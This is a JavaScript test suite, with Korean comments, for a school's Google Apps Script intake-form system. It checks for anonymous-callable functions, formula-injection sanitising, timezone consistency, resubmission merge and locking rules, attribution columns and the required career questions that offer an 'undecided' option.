  // 이 프로젝트는 HtmlService를 반환하므로 google.script.run 표면이 곧 공격 표면이다.
  // 상담시트.js도 같은 프로젝트라 노출 표면이 합쳐진다 — 한 파일만 검사하면 새 파일이 사각이 된다
  const fns = [...(server + '\n' + 상담).matchAll(/^function ([A-Za-z가-힣_][\w가-힣]*)\s*\(/gm)].map((m) => m[1]);
  const exposed = fns.filter((n) => !n.endsWith('_') && !['doGet', 'doPost'].includes(n));
  assert.deepEqual(exposed, [], `밑줄 종결이 아닌 전역 함수: ${exposed} — 익명자가 부를 수 있다`);
});

test('상담시트 이관 — 안전 불변식(학생ID 비움·소독·중복 차단·반 정본 24)', () => {
  // 공개 폼이 곧바로 앱 로스터가 되면 장난 제출 한 번이 학생 계정이 된다.
  // syncProfiles가 학생ID 없는 행을 건너뛰는 성질이 유일한 안전 지점이므로, 이관은 ID를 비워야만 한다.
  /* ⚠ 이름을 `매핑` 에서 갈랐다 — 이 파일엔 `매핑` 선언이 넷인데 :436 은 원문 그대로다.
   *   계수기는 파일 하나를 한 스코프로 근사하고 «첫 선언이 이긴다» — 같은 이름을 쓰면 여기 정제본이
   *   저쪽 원문까지 「안전」으로 물들인다(숫자는 좋아지는데 사각은 남는 결말 · 조편성 `골격코드` 와 같은 처분). */
  const 매핑코드 = 코드만(상담.slice(상담.indexOf('function 크루카드_상담매핑_'), 상담.indexOf('function 상담시트_이관_')));
  assert.ok(!/['"]학생ID['"]\s*:/.test(매핑코드), '이관 매핑이 학생ID를 채운다 — 공개 접수가 앱 로스터로 직행한다');
  assert.ok(!/['"]반['"]\s*:/.test(매핑코드), '이관 매핑이 「반」을 채운다 — 배정은 사람의 결정이어야 한다');

  const 이관 = 상담.slice(상담.indexOf('function 상담시트_이관_'), 상담.indexOf('function 상담_첫빈행_'));
  assert.ok(이관.includes('셀안전_('), '이관 경로가 소독을 안 지난다 — 상담시트로 수식 인젝션 우회');
  assert.ok(이관.includes("=== serial) return { ok: true, skip: 'dup' }"), '중복 이관 차단이 없다');
  assert.ok(이관.includes('상담_첫빈행_'), 'appendRow를 쓰면 서식만 있는 빈 행 아래로 튄다');

  // 반 키 정본 24종 — docs/반편성_정본_v2.md와 갈리면 드롭다운이 거짓을 가리킨다
  const 반fn = 상담.match(/function 반키정본_\(\)[\s\S]*?\n\}/)[0].replace(/\r\n/g, '\n');
  const 반키 = new Function(반fn.slice(반fn.indexOf('{') + 1, 반fn.lastIndexOf('}')))();
  assert.equal(반키.length, 24, `반 키가 ${반키.length}종 — 4실 24반 정본과 다르다`);
  assert.ok(반키.includes('평일11A') && 반키.includes('평일18D') && 반키.includes('주말14D'), '반 키 형식이 정본과 다르다');

  // 삭제 함수(샘플정리)는 유지보수용이다 — 익명 진입점에서 부르는 순간 공개 GET/POST가 행을 지운다
  const 진입 = server.slice(server.indexOf('function doGet'), server.indexOf('function 크루_탭_'));
  assert.ok(!/상담시트_샘플정리_|deleteRow/.test(코드만(진입)), 'doGet/doPost가 삭제 경로에 닿는다');
});

test('등록일 — 카드를 열면 오늘 날짜가 이미 들어가 있다(KR·MN)', () => {
  // 유호 요청(08-04): 「켜자마자 날짜는 전부 입력되어 있었으면」.
  // 문자열 존재만 보면 블록이 죽어도 초록이 된다(F047과 같은 함정) → 실제로 실행해 값을 본다.
  for (const [이름, html] of [['KR', htmlKr], ['MN', htmlMn]]) {
    const m = html.match(/\(function 등록일_오늘로\(\)\{[\s\S]*?\}\)\(\);/);
    assert.ok(m, `${이름}: 등록일 자동 입력 블록이 없다`);
    const inputs = { year: {}, month: {}, day: {} };
    new Function('inputs', m[0])(inputs);
    const t = new Date(), p2 = (n) => (n < 10 ? '0' : '') + n;
    assert.equal(inputs.year.value, String(t.getFullYear()), `${이름}: 연도가 오늘이 아니다`);
    assert.equal(inputs.month.value, p2(t.getMonth() + 1), `${이름}: 월이 오늘이 아니다`);
    assert.equal(inputs.day.value, p2(t.getDate()), `${이름}: 일이 오늘이 아니다`);
    // 저장본 복원은 그대로 막혀 있어야 한다 — 어제 값이 되살아나면 자동 입력이 무의미하다
    assert.ok(/NO_RESTORE = new Set\(\['year','month','day'\]\)/.test(html), `${이름}: 날짜가 저장본에서 복원된다`);
  }
});

test('날짜 기준 — 채번과 등록일이 같은 타임존(시트 TZ를 믿지 않는다)', () => {
  // 실측: 이 스프레드시트 TZ는 America/Los_Angeles다. 시트 TZ로 등록일을 찍으면
  // 크루카드번호 SL-20260804 와 등록일 2026-08-03 이 같은 행에서 하루 어긋난다.
  assert.ok(/const TZ_ = 'Asia\/Ulaanbaatar'/.test(server), 'TZ_ 정본 상수가 없다');
  assert.ok(!/getSpreadsheetTimeZone/.test(코드만(상담)), '등록일이 시트 TZ를 쓴다 — 채번과 하루 어긋난다');
  const 채번 = server.match(/Utilities\.formatDate\(.*yyyyMMdd'\)/)[0];
  assert.ok(채번.includes('TZ_'), `채번이 TZ_를 안 쓴다: ${채번}`);
  assert.ok(/Utilities\.formatDate\(new Date\(\), TZ_, 'yyyy-MM-dd'\)/.test(상담), '등록일이 TZ_를 안 쓴다');
});

test('상담시트 증분 — 선언한 헤더가 전부 실제로 채워지고, 라벨 키가 카드 컬럼에 있다', () => {
  // 헤더만 늘리고 매핑을 빠뜨리면 열은 생기는데 영원히 빈칸이다 — 「연동됐다」로 보이는 최악의 실패.
  const 헤더fn = 상담.match(/const 증분헤더_ = \[[\s\S]*?\n\];/)[0];
  const 증분 = new Function(`${헤더fn}; return 증분헤더_;`)();
  const 매핑 = 상담.slice(상담.indexOf('function 크루카드_상담매핑_'), 상담.indexOf('function 상담시트_이관_'));
  for (const h of 증분) {
    assert.ok(매핑.includes(`'${h}'`), `헤더 「${h}」를 선언만 하고 매핑이 없다 — 열이 영원히 빈칸이 된다`);
  }
  assert.ok(증분.length >= 33, `증분 헤더가 ${증분.length}개 — 2차 증분(관리 항목)이 빠졌다`);

  // 라벨 맵의 키는 전부 실제 카드 컬럼이어야 한다. 오타 1글자면 그 옵션만 조용히 사라진다.
  const cols = new Set(COLUMNS);
  const 맵들 = 상담.match(/const [^\s]*라벨_ = \{[\s\S]*?\n\};/g) || [];
  assert.ok(맵들.length >= 11, `라벨 맵이 ${맵들.length}종 — 2차 증분 맵이 빠졌다`);
  for (const src of 맵들) {
    const 이름 = src.match(/const ([^\s]+) =/)[1];
    const 맵 = new Function(`${src}; return ${이름};`)();
    for (const k of Object.keys(맵)) {
      assert.ok(cols.has(k), `${이름}.${k} 가 COLUMNS에 없다 — 그 선택지는 시트에 영원히 안 찍힌다`);
    }
  }
  // 1~5 척도 축도 같은 함정 — 축 키가 틀리면 요약이 통째로 빈칸이 된다
  for (const 축이름 of ['목표축_', '노출축_']) {
    const src = 상담.match(new RegExp(String.raw`const ${축이름} = \{[\s\S]*?\n\};`))[0];
    const 축 = new Function(`${src}; return ${축이름};`)();
    for (const k of Object.keys(축)) assert.ok(cols.has(k), `${축이름}.${k} 가 COLUMNS에 없다`);
  }
  const 성향 = new Function(`${상담.match(/const 성향축_ = \[[\s\S]*?\n\];/)[0]}; return 성향축_;`)();
  for (const a of 성향) assert.ok(cols.has(a.col), `성향축_.${a.col} 가 COLUMNS에 없다`);
});

test('상담시트 증분 — 실제로 값이 찍힌다(선언·매핑이 아니라 결과로 확인)', () => {
  // 헤더도 있고 매핑 키도 있는데 라벨 접두어가 어긋나 빈칸이 나오는 게 이 구조의 고유 실패다.
  // 그래서 문자열이 아니라 **매핑 함수를 실제로 돌려** 칸이 차는지 본다.
  const pure = 상담.slice(0, 상담.indexOf('function 상담시트_이관_'));
  const 매핑 = new Function(pure + '; return 크루카드_상담매핑_;')();
  const 증분 = new Function(pure + '; return 증분헤더_;')();

  const 가짜 = {};
  COLUMNS.forEach((c) => { 가짜[c] = true; });        // 전 문항 응답 — 체크박스·척도 모두 참으로 읽힌다
  const out = 매핑(가짜, 'kr', 'SL-20260804-999', '2026-08-04');

  const 빈칸 = 증분.filter((h) => !String(out[h] || '').trim());
  assert.deepEqual(빈칸, [], `전 문항을 채웠는데 빈칸으로 남는 증분 열: ${빈칸.join(', ')}`);

  // 안전 불변식은 결과에서도 성립해야 한다 — 매핑이 우회로로 ID·반을 만들지 않는지
  assert.equal(out['학생ID'], undefined, '매핑 결과가 학생ID를 만든다');
  assert.equal(out['반'], undefined, '매핑 결과가 「반」을 만든다');

  // 빈 제출이면 요약 칸은 빈칸이어야 한다(빈 값을 「없음」 같은 가짜 값으로 채우지 않는다)
  const 빈출력 = 매핑({}, 'mn', 'SL-20260804-000', '2026-08-04');
  assert.equal(빈출력['목표강도'], '', '빈 제출인데 목표강도에 값이 생긴다');
  assert.equal(빈출력['성격유형'], '', '빈 제출인데 성격유형에 값이 생긴다');
  assert.equal(빈출력['접수출처'], '크루카드-몽골어', '접수출처가 언어를 반영하지 않는다');
});

/* ═══════════════════════════════════════════════════════════════════
 * 재제출 정책 [v9.168] — 「행이 어떻게 되는가」로 검사한다
 *   이 정책의 값은 전부 결과에 있다: 행이 늘어나는가, 사람이 넣은 값이 살아남는가.
 *   문자열 grep으로는 «덮지 않는다»를 증명할 수 없어 가짜 시트로 실제 이관을 돌린다.
 * ═══════════════════════════════════════════════════════════════════ */
const 이관헤더_ = ['이름(한국어)', '이름(몽골어)', '연락처', '이메일', '거주지역',
  '등록일', '접수출처', '처리상태', '크루카드번호', '학생ID', '반', '담당자',
  // [2026-08-04] 어트리뷰션 2열. 없으면 매핑이 `h.map[name] === undefined`로 **조용히 건너뛰어**
  // 재제출 거동이 검사되지 않은 채 초록이 된다(가드가 지킨다는 열을 실제로 열지 않는 계열).
  '인지채널', '추천인'];

/* 쓰기·읽기·삼킴은 **공용 통로**에 얹는다(`tests/lib/시트흉내.js` · #Q85 · F460).
 *   손으로 다시 지으면 사본이 되고, 라이브와 갈라져도 아무도 못 잰다. */
function 가짜시트_(headers, dataRows) {
  const W = headers.length;
  const pad = (r) => { const o = r.slice(); while (o.length < W) o.push(''); return o; };
  const grid = [new Array(W).fill(''), pad(headers)];
  (dataRows || []).forEach((r) => grid.push(pad(r)));
  const sh = 시트흉내({ 첫행: 1, 행들: grid });
  return Object.assign(sh, { grid: sh.data, getLastColumn: () => W });
}

function 이관하네스_(src) {
  const 보관 = { sh: null };
  const 셀안전 = (v) => (/^[=+\-@\t\r]/.test(String(v)) ? "'" + String(v) : String(v));
  const SS = { openById: () => ({ getSheetByName: (n) => (n === '상담데이터입력' ? 보관.sh : null) }) };
  const U = { formatDate: () => '2026-08-09' };
  const api = new Function('SpreadsheetApp', 'Utilities', '셀안전_', 'MAX_CELL', 'CONSULT_SHEET_ID', 'TZ_',
    (src || 상담) + '\nreturn { 이관: 상담시트_이관_, 키: 동일인키_ };')(SS, U, 셀안전, 2000, 'FAKE', 'Asia/Ulaanbaatar');
  api.시트 = 보관;
  api.열 = (name) => 이관헤더_.indexOf(name);
  api.값 = (row, name) => 보관.sh.grid[row - 1][이관헤더_.indexOf(name)];
  return api;
}

test('재제출 — 같은 사람은 행이 늘지 않는다(미착수면 최신 제출이 정본)', () => {
  const h = 이관하네스_();
  h.시트.sh = 가짜시트_(이관헤더_, []);

  const r1 = h.이관({ name_kr: '바트', phone: '99112233', residence: '울란바토르', email: 'a@b.c' }, 'kr', 'SL-20260809-001');
  assert.equal(r1.merge, 'new', '첫 제출은 새 행이어야 한다');
  assert.equal(h.시트.sh.grid.length, 3, '첫 제출 후 데이터 1행');
  assert.equal(h.값(3, '처리상태'), '신규접수');

  // 같은 사람이 국가번호·하이픈까지 다르게 적어도 같은 사람이다
  const r2 = h.이관({ name_kr: '바트', phone: '+976 9911-2233', residence: '다르한' }, 'kr', 'SL-20260809-002');
  assert.equal(r2.merge, 'update', '재제출인데 새 행이 생겼다 — 원장이 둘 다 반배정하면 학생ID가 두 번 나간다');
  assert.equal(h.시트.sh.grid.length, 3, '재제출로 행이 늘었다');
  assert.equal(h.값(3, '거주지역'), '다르한', '미착수 행인데 최신 내용으로 안 바뀌었다');
  assert.equal(h.값(3, '크루카드번호'), 'SL-20260809-002 ← SL-20260809-001',
    '크루카드번호 이력이 끊기면 이 행이 crew_cards의 어느 원본에서 왔는지 못 찾는다');

  // 빈 값으로는 덮지 않는다 — 부분 재제출이 이미 받아둔 답을 지우면 재제출이 손해가 된다
  const r3 = h.이관({ name_kr: '바트', phone: '99112233' }, 'kr', 'SL-20260809-003');
  assert.equal(r3.merge, 'update');
  assert.equal(h.값(3, '거주지역'), '다르한', '빈 값이 기존 답을 지웠다');
  assert.equal(h.값(3, '이메일'), 'a@b.c', '빈 값이 기존 이메일을 지웠다');
});

test('재제출 — 「언제·어디로·어디까지」는 재제출이 못 바꾼다', () => {
  const h = 이관하네스_();
  h.시트.sh = 가짜시트_(이관헤더_, []);
  h.이관({ name_kr: '바트', phone: '99112233' }, 'kr', 'SL-20260809-001');
  const 등록일0 = h.값(3, '등록일'), 출처0 = h.값(3, '접수출처');
  h.시트.sh.grid[2][h.열('처리상태')] = '검토중';          // 원장이 큐에서 한 칸 옮겨둔 상태

  h.이관({ name_kr: '바트', phone: '99112233', residence: '다르한' }, 'mn', 'SL-20260809-002');
  assert.equal(h.값(3, '등록일'), 등록일0, '등록일이 재제출 날짜로 밀리면 접수→상담 리드타임이 통째로 거짓이 된다');
  assert.equal(h.값(3, '접수출처'), 출처0, '접수출처는 최초 유입 경로다');
  assert.equal(h.값(3, '처리상태'), '검토중', '재제출이 처리상태를 「신규접수」로 되돌렸다 — 원장 진행이 리셋된다');
});

test('재제출 — 사람이 손댄 행은 한 칸도 덮지 않는다(공개 접수가 결정을 못 이긴다)', () => {
  for (const 상태 of ['상담완료', '반배정', '앱편입', '보류', '취소']) {
    const h = 이관하네스_();
    h.시트.sh = 가짜시트_(이관헤더_, [
      ['바트', 'Бат', '99112233', 'a@b.c', '울란바토르', '2026-08-01', '크루카드-한국어', 상태, 'SL-20260801-001', 'SYNK-002', '평일11A', '유호'],
    ]);
    const 전 = h.시트.sh.grid[2].slice();

    const r = h.이관({ name_kr: '바트', phone: '99112233', residence: '다르한', email: 'evil@x.y' }, 'kr', 'SL-20260809-009');
    assert.equal(r.merge, 'locked', `${상태} 행이 잠기지 않았다`);
    assert.equal(h.시트.sh.grid.length, 3, `${상태}인데 재제출이 새 행을 만들었다 — 학생ID 이중 발급 경로`);
    assert.equal(h.값(3, '학생ID'), 'SYNK-002', `${상태}: 공개 제출이 학생ID를 건드렸다`);
    assert.equal(h.값(3, '반'), '평일11A', `${상태}: 공개 제출이 배정을 덮었다`);
    assert.equal(h.값(3, '담당자'), '유호', `${상태}: 공개 제출이 담당자를 덮었다`);
    assert.equal(h.값(3, '거주지역'), '울란바토르', `${상태}: 공개 제출이 상담 기록을 덮었다`);
    // 바뀌어도 되는 건 크루카드번호 하나뿐
    전.forEach((v, i) => {
      if (i === h.열('크루카드번호')) return;
      assert.equal(h.시트.sh.grid[2][i], v, `${상태}: ${이관헤더_[i]} 칸이 바뀌었다`);
    });
    assert.equal(h.값(3, '크루카드번호'), 'SL-20260809-009 ← SL-20260801-001', '재제출 사실이 안 남으면 원장이 영원히 모른다');
  }
});

test('동일인키_ — 놓치는 쪽으로만 틀린다(잘못 합치면 남의 상담 기록을 덮는다)', () => {
  const { 키 } = 이관하네스_();
  assert.equal(키('바트', '+976 9911-2233'), 키('바트', '99112233'), '국가번호·하이픈 표기가 다르면 다른 사람이 된다');
  assert.equal(키('바 트', '99112233'), 키('바트', '99112233'), '공백 표기 흔들림');
  assert.equal(키('바트', '00976 99112233'), 키('바트', '99112233'), '00 국제전화 접두');
  assert.notEqual(키('바트', '99112233'), 키('솔롱고', '99112233'), '형제가 가족 번호를 같이 적으면 한 사람으로 합쳐진다');
  assert.notEqual(키('바트', '99112233'), 키('바트', '88112233'), '동명이인이 합쳐진다');
  assert.equal(키('', '99112233'), '', '이름이 비면 키가 없어야 한다 — 빈 키끼리 서로 같아지면 남남이 합쳐진다');
  assert.equal(키('바트', ''), '', '연락처가 비면 키가 없어야 한다');
  // 한국 번호는 976으로 시작하지 않으므로 그대로 — 잘라내면 서로 다른 번호가 같아질 수 있다
  assert.notEqual(키('김재헌', '01055421768'), 키('김재헌', '01055421769'));
});

test('재제출 — 이름·연락처가 비면 절대 합치지 않는다(빈 키 사고)', () => {
  const h = 이관하네스_();
  h.시트.sh = 가짜시트_(이관헤더_, [['', '', '', '', '', '2026-08-01', '크루카드-한국어', '신규접수', 'SL-20260801-001']]);
  const r = h.이관({ name_kr: '', phone: '' }, 'kr', 'SL-20260809-001');
  assert.notEqual(r.merge, 'update', '이름·연락처가 빈 제출이 남의 빈 행에 덮어썼다');
});

test('재제출 — 이력 칸은 횟수에 비례해 자라지 않는다(라이브에서 5개까지 자란 실결함)', () => {
  // 재제출은 본래 여러 번 하는 행위다. 칸이 횟수만큼 자라면 결국 못 읽는 칸이 된다.
  const h = 이관하네스_();
  h.시트.sh = 가짜시트_(이관헤더_, []);
  for (let i = 1; i <= 7; i++) {
    h.이관({ name_kr: '바트', phone: '99112233' }, 'kr', 'SL-20260809-00' + i);
  }
  assert.equal(h.시트.sh.grid.length, 3, '7회 제출이 행을 늘렸다');
  const 이력 = String(h.값(3, '크루카드번호'));
  assert.equal(이력, 'SL-20260809-007 ← SL-20260809-006 · 총 7건');
  assert.ok(이력.length <= 60, `이력 칸이 ${이력.length}자 — 횟수에 비례해 자란다`);
  // 2회까지는 카운트를 달지 않는다(가장 흔한 경우를 시끄럽게 만들지 않는다)
  const g = 이관하네스_();
  g.시트.sh = 가짜시트_(이관헤더_, []);
  g.이관({ name_kr: '솔롱고', phone: '88112233' }, 'kr', 'SL-20260809-001');
  g.이관({ name_kr: '솔롱고', phone: '88112233' }, 'kr', 'SL-20260809-002');
  assert.equal(g.값(3, '크루카드번호'), 'SL-20260809-002 ← SL-20260809-001');
});

/* ═══════════════════════════════════════════════════════════════════
 * 어트리뷰션 2열 [2026-08-04] — 「인지채널 수복」
 *   이 열은 원래 마케팅 유입경로 자리인데 크루카드가 학습 성향(시각형/청각형)을 덮어써
 *   KPI 채널 집계가 「시각형(4)」을 유입 채널로 세고 있었다. 되찾은 뒤 다시 안 밀리게 못박는다.
 * ═══════════════════════════════════════════════════════════════════ */
test('인지채널은 학습 성향이 아니라 유입경로 8버킷이다 — 성향은 성격유형으로 간다', () => {
  const pure = 상담.slice(0, 상담.indexOf('function 상담시트_이관_'));
  const 매핑 = new Function(pure + '; return 크루카드_상담매핑_;')();
  const out = 매핑({ source: '추천', referrer: '바야르', trait_visual_auditory: 4 },
    'kr', 'SL-20260804-001', '2026-08-04');
  assert.equal(out['인지채널'], '추천',
    '인지채널이 유입경로가 아니다 — 이 열은 엔진_운영배치 computeKpiMetrics가 채널 어트리뷰션으로 읽는다');
  assert.equal(out['추천인'], '바야르');
  // 잃은 정보가 없어야 수복이 성립한다(성향축_에 trait_visual_auditory가 살아 있는지)
  assert.match(String(out['성격유형']), /청각형/,
    '시각/청각 성향이 어디에도 안 남았다 — 인지채널을 되찾으면서 정보를 잃었다');
});

test('유입경로 값은 leads·리드폼과 같은 8버킷이다 — 새 분류를 만들면 지표가 갈린다', () => {
  const 버킷 = ['페이스북', '인스타', '틱톡', '추천', '오픈데이', '학교제휴', '워크인', '기타'];
  const html = fs.readFileSync(path.join(ROOT, 'crewcard', '카드_kr.html'), 'utf8');
  const mn = fs.readFileSync(path.join(ROOT, 'crewcard', '카드_mn.html'), 'utf8');
  for (const b of 버킷) {
    assert.ok(html.includes(`data-column="source" data-value="${b}"`), `KR 카드에 버킷 「${b}」가 없다`);
    // 🔴 몽골어판도 data-value는 한국어다 — 번역하면 시트에 두 언어 값이 섞여 집계가 반쪽이 된다
    assert.ok(mn.includes(`data-column="source" data-value="${b}"`), `MN 카드의 버킷 「${b}」가 한국어 값이 아니다`);
  }
});

test('재제출 — 인지채널은 못 덮고, 추천인은 덮는다', () => {
  // 유입경로는 「처음 어디로 들어왔나」라 접수출처와 같은 계급이다. 재제출로 밀리면 CPL이 거짓이 된다.
  // 추천인은 반대다 — 처음엔 몰랐다가 나중에 적어 주는 것이 정상이라 최신값이 맞다.
  const h = 이관하네스_();
  h.시트.sh = 가짜시트_(이관헤더_, []);
  h.이관({ name_kr: '바트', phone: '99112233', source: '페이스북' }, 'kr', 'SL-20260804-001');
  h.이관({ name_kr: '바트', phone: '99112233', source: '추천', referrer: '솔롱고' }, 'kr', 'SL-20260805-001');
  assert.equal(h.시트.sh.grid.length, 3, '재제출이 행을 늘렸다');
  assert.equal(h.값(3, '인지채널'), '페이스북',
    '재제출이 유입경로를 덮었다 — 「페이스북 광고로 알았다」가 「추천」으로 바뀌면 어트리뷰션이 통째로 밀린다');
  assert.equal(h.값(3, '추천인'), '솔롱고', '나중에 적어 준 추천인이 반영되지 않았다');
});

/* ═══════════════════════════════════════════════════════════════════════════
 * 진로 5문항 제출 게이트 [2026-08-04 유호님 확정]
 *
 * 왜 있나: 로드맵 ④(유학 집약 봇)의 재료는 「무엇을 목표했고 실제로 어디로 갔나」의 짝이다.
 *   왼쪽(의도)이 비면 오른쪽(결과)을 아무리 모아도 궤적이 안 만들어진다. 그리고 **소급 불가**다 —
 *   입학 상담은 인생에 한 번이고, 그때 안 받은 답은 3년 뒤에 못 받는다.
 * 이 블록이 지키는 것 중 가장 중요한 건 「필수화」가 아니라 **「빠져나갈 곳이 있는가」**다.
 * ═══════════════════════════════════════════════════════════════════════════ */

const 게이트 = (html) => {
  const m = /var CAREER_REQ = (\[[\s\S]*?\n  \]);/.exec(html);
  assert.ok(m, 'CAREER_REQ 정의를 못 찾았다 — 제출 게이트가 사라졌거나 형태가 바뀌었다');
  return new Function('return ' + m[1])();
};

test('🔴 진로 5문항이 제출을 막는다 (KR·MN 동일) — 왼쪽이 비면 궤적이 안 만들어진다', () => {
  const 기대 = ['future_10y', 'topik_target', 'degree_target', 'visa_target', 'field_interest'];
  for (const [name, html] of [['kr', htmlKr], ['mn', htmlMn]]) {
    assert.deepEqual(게이트(html).map((q) => q.field), 기대, `[${name}] 게이트 대상 5문항이 바뀌었다`);
  }
});

test('🔴 다섯 전부에 「아직 미정」이 있다 — 빠져나갈 곳 없는 필수는 아무거나 찍게 만든다', () => {
  /* 이 검사가 이 블록에서 제일 중요하다. 정직한 「모르겠다」가 없는 필수 문항은 답을 받는 게 아니라
   * **거짓 목표를 만든다**. 그렇게 들어온 값으로 만든 궤적은 없느니만 못하다 —
   * 「학사를 목표했는데 E-9로 갔다」가 사실은 「아무거나 눌렀다」인지 구별할 수 없기 때문이다.
   * 「미정」은 결측이 아니라 관측된 상태다: 상담에서 먼저 물어야 할 사람이 누구인지 알려준다. */
  const 탈출구 = { future_10y: '아직 미정', topik_target: '아직 미정', degree_target: '아직 미정',
    visa_target: '미정 · 상담 필요', field_interest: '아직 미정' };
  for (const [name, html] of [['kr', htmlKr], ['mn', htmlMn]]) {
    for (const q of 게이트(html)) {
      const v = 탈출구[q.field];
      const col = q.col || (q.prefix + 'undecided');
      assert.ok(html.includes(`data-field="${q.field}" data-column="${col}" data-value="${v}"`),
        `[${name}] 「${q.field}」에 「${v}」 선택지가 없다 — 필수인데 빠져나갈 곳이 없으면 거짓 데이터가 쌓인다`);
    }
  }
});

test('게이트가 실제로 제출을 끊는다 — 판정만 하고 흘려보내지 않는다', () => {
  for (const [name, html] of [['kr', htmlKr], ['mn', htmlMn]]) {
    const sub = html.slice(html.indexOf('function submit(){')).slice(0, 400);
    assert.match(sub, /var miss = validateMin\(data\);[\s\S]*?if\(miss\)\{[^}]*return;/,
      `[${name}] 미충족인데 return 하지 않는다 — 경고만 띄우고 그대로 전송된다`);
    assert.ok(/focusField\(miss\.field\)/.test(sub),
      `[${name}] 미충족 문항으로 데려가지 않는다 — 3,500줄 카드에서 어디를 고칠지 모른다`);
  }
});

test('KR·MN 게이트는 라벨만 다르다 — 갈라지면 몽골어 접수만 진로가 빈 채로 들어온다', () => {
  const 키 = (html) => 게이트(html).map((q) => [q.field, q.col || '', q.prefix || ''].join('|'));
  assert.deepEqual(키(htmlKr), 키(htmlMn), '두 판의 게이트 대상이 다르다 — 절반이 궤적에서 빠진다');
  for (const [name, html] of [['kr', htmlKr], ['mn', htmlMn]]) {
    assert.ok(/"needCareer":/.test(html), `[${name}] needCareer 안내 문구가 없다 — undefined 가 alert 에 뜬다`);
    게이트(html).forEach((q) => assert.ok(q.label && q.label.trim(), `[${name}] ${q.field} 라벨이 비었다`));
  }
});

/** HTML 안 최상위 function 본문을 이름으로 잘라 온다(중괄호 깊이 추적). */
function 함수본문_(src, name) {
  const i = src.indexOf('function ' + name + '(');
  assert.notEqual(i, -1, name + ' 함수를 못 찾았다');
  let d = 0, on = false;
  for (let j = i; j < src.length; j++) {
    if (src[j] === '{') { d++; on = true; }
    else if (src[j] === '}') { d--; if (on && d === 0) return src.slice(i, j + 1); }
  }
  assert.fail(name + ' 본문 끝을 못 찾았다');
}

test('🔴 런타임이 만드는 data-column이 전부 COLUMNS에 있다 — 없으면 그 답만 조용히 사라진다', () => {
  /* 2026-08-04 적대 리뷰가 실측한 사고: bindSchema는 로드 시 다중 문항 체크박스의 data-column을
   *   `column_prefix + '_' + slugifyOption(옵션)` 으로 **덮어쓴다**. 그런데 slugifyOption의 폴백은
   *   `[^a-z0-9]+ → _` 라 **한글만 있는 옵션에서 빈 문자열**을 만든다 — 새로 넣은 「아직 미정」이
   *   정확히 그 경우였고, data-column이 `field_interest_` 가 되어 서버 COLUMNS에 없는 키로 전송됐다.
   * 🔑 증상은 「제출은 성공했는데 그 칸만 빈다」 — 화면·로그·기존 회귀 어디에도 안 뜬다.
   *   그래서 문자열이 아니라 **실제 슬러그를 계산해** COLUMNS와 대조한다. */
  const slug = new Function(함수본문_(htmlKr, 'slugifyOption') + '\nreturn slugifyOption;')();
  const baked = JSON.parse(Buffer.from(
    /"fieldSchema":\s*"data:application\/json;base64,([A-Za-z0-9+/=]+)"/.exec(htmlKr)[1], 'base64').toString('utf8'));
  const 빈슬러그 = [], 유령 = [];
  for (const sec of baked.sections) {
    for (const f of sec.fields) {
      if (f.type !== 'multi' || !f.column_prefix) continue;
      for (const o of f.options || []) {
        const s = slug(o);
        if (!s) { 빈슬러그.push(`${f.field_id}/${o}`); continue; }
        if (!COLUMNS.includes(f.column_prefix + '_' + s)) 유령.push(`${f.field_id}/${o} → ${f.column_prefix}_${s}`);
      }
    }
  }
  assert.deepEqual(유령, [], '런타임 슬러그가 COLUMNS에 없는 열을 만든다 — 그 답은 시트에 영영 안 실린다');
  assert.deepEqual(빈슬러그, [], 'slugifyOption 테이블에 없는 한글 옵션 — 빈 슬러그가 나온다(테이블에 추가하라)');
});

test('🔑 빈 슬러그면 정적 bake를 덮어쓰지 않는다 — 테이블 누락이 데이터 유실이 되지 않게', () => {
  /* 위 검사는 「지금」을 지킨다. 이 검사는 **다음에 한글 옵션을 추가하는 사람**을 지킨다 —
   * 테이블에 넣는 걸 잊어도 마크업의 정적 bake가 살아남아 답이 사라지지 않는다(2겹). */
  for (const [name, html] of [['kr', htmlKr], ['mn', htmlMn]]) {
    const 덮는곳 = html.split('\n').filter((l) => /setAttribute\('data-column', field\.column_prefix/.test(l));
    assert.ok(덮는곳.length >= 2, `[${name}] data-column 덮어쓰기 지점을 못 찾았다 — 검사가 무력화됐다`);
    덮는곳.forEach((l) => assert.ok(/_sl\b|_slT\b/.test(l),
      `[${name}] 슬러그 확인 없이 바로 덮어쓴다: ${l.trim().slice(0, 90)}`));
  }
});

test('🔑 하이라이트 지우기가 조기 반환보다 먼저다 — 동의에서 막히면 옛 테두리가 남는다', () => {
  /* validateMin이 동의에서 걸리면 field=null 로 돌아오는데, 그때 focusField가 먼저 return 하면
   * 직전에 칠한 진로 문항 테두리가 남아 **이미 채운 칸**을 가리킨다. 비개발자 접수자가 엉뚱한 칸을 연다. */
  for (const [name, html] of [['kr', htmlKr], ['mn', htmlMn]]) {
    const fn = 함수본문_(html, 'focusField');
    const i지움 = fn.indexOf("$$('.synk-need')");
    const i반환 = fn.indexOf('if(!fieldId) return;');
    assert.ok(i지움 !== -1 && i반환 !== -1, `[${name}] focusField 구조가 바뀌었다`);
    assert.ok(i지움 < i반환, `[${name}] 조기 반환이 하이라이트 지우기보다 앞이다 — 옛 테두리가 남는다`);
  }
});

test('「아직 미정」 전공이 시트 요약에 실린다 — 라벨이 없으면 그 답만 통째로 사라진다', () => {
  /* 다중 문항은 다중요약_가 라벨 맵을 돌며 TRUE 인 것만 문장으로 접는다.
   * 맵에 없는 컬럼은 **조용히 빠진다** — 필수로 만들어 놓고 그 답이 시트에서 증발하면
   * 「미정을 고른 사람」과 「아무것도 안 고른 사람」이 같은 빈칸이 된다. */
  assert.match(상담, /field_interest_undecided:\s*'미정'/,
    '전공관심라벨_에 field_interest_undecided 가 없다 — 「아직 미정」 응답이 요약 칸에서 사라진다');
});
